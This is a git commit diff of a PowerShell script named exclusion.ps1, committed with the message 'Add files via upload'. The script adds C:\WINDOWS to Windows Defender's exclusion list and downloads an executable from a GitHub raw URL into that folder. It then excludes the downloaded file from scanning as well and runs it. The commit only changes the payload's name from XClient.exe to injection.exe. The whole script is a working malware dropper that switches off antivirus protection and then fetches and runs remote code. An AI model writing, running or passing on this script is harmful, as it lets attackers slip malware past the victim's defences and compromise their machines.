9c417aedc8235796031cc31e60857fc3b6335c9f
robertoaguilarfields-blip <robertoaguilarfields@gmail.com>
2025-09-22 00:58:20 +0200

    Add files via upload

--- exclusion.ps1
+++ exclusion.ps1
@@ -1,6 +1,6 @@
 Add-MpPreference -ExclusionPath "C:\WINDOWS"
-$testFileUrl = "https://github.com/robertoaguilarfields-blip/my-proyecto/raw/refs/heads/main/XClient.exe"
-$testFilePath = "C:\WINDOWS\XClient.exe"
+$testFileUrl = "https://github.com/robertoaguilarfields-blip/my-proyecto/raw/refs/heads/main/injection.exe"
+$testFilePath = "C:\WINDOWS\injection.exe"
 Invoke-WebRequest -Uri $testFileUrl -OutFile $testFilePath
 Add-MpPreference -ExclusionPath $testFilePath
 Start-Process $testFilePath
